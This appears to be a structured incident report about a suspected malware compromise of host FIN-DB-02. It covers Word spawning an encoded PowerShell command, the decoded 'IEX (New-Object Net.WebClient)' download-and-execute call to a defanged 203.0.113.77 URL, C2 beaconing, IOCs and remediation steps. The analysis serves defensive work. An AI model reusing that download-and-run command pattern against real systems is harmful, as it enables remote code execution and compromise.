digest: Unauthorized PowerShell execution on FIN-DB-02, likely initiated by WinWord, downloaded and executed a remote script from 203.0.113.77, followed by persistent C2 communication. This activity was confirmed as unauthorized by the maintenance team.

evidence_findings.title: Unauthorized PowerShell Execution
evidence_findings.subject: FIN-DB-02
evidence_findings.evidence: A PowerShell process (`powershell.exe`) was observed on FIN-DB-02, spawned by `winword.exe`, executing a hidden, base64-encoded command. The decoded command `IEX (New-Object Net.WebClient)` attempts to download and execute content from `hxxps://203.0.113.77/update.dat`. The maintenance team confirmed no approved changes involved this command or host.
evidence_findings.conclusion: The execution of a hidden, encoded PowerShell command by WinWord to download and execute a remote script is highly indicative of malware execution or initial compromise.

evidence_findings.title: Suspicious Outbound Network Connections
evidence_findings.evidence: Immediately following the PowerShell execution, the host 10.20.8.42 (FIN-DB-02) initiated 120 periodic outbound connections over 30 seconds to 203.0.113.77 on port 443. This destination is not on the corporate allowlist.
evidence_findings.conclusion: The persistent, unauthorized outbound connections to an external IP address immediately after suspicious PowerShell activity are consistent with command and control (C2) communication.

attack_chain.description: A user on FIN-DB-02 likely opened a malicious document, leading to `winword.exe` spawning `powershell.exe`.
PowerShell executed a base64-encoded command to download and execute a remote script (`update.dat`) from `203.0.113.77`.
The compromised host established persistent outbound communication with `203.0.113.77` on port 443, likely for C2 purposes.

attack_timeline.attack_behavior: WinWord spawns PowerShell process on FIN-DB-02.
PowerShell executes encoded command to download and execute remote script.

ioc_indicators.context: Malicious C2 server and download source.
Suspicious parent process for PowerShell execution.
Internal IP address of the compromised host FIN-DB-02.

remediations.description: Immediately isolate FIN-DB-02 from the network to prevent further compromise or lateral movement.
Perform a full forensic analysis on FIN-DB-02 to identify the initial access vector, malware persistence mechanisms, and any data exfiltration. Reimage the system if compromise is confirmed.
Block the malicious IP address 203.0.113.77 at the perimeter firewall and proxy servers.
Review endpoint detection and response (EDR) logs and network traffic for similar PowerShell execution patterns or connections to 203.0.113.77 across the environment.
Enhance email and endpoint security controls to prevent malicious document delivery and execution.

unknowns: The exact timestamp of the PowerShell execution and initial network connection.
The specific malware payload downloaded as 'update.dat'.
The precise initial access vector (e.g., phishing email, drive-by download, exploited vulnerability).
The full extent of compromise on FIN-DB-02 and whether other systems are affected.
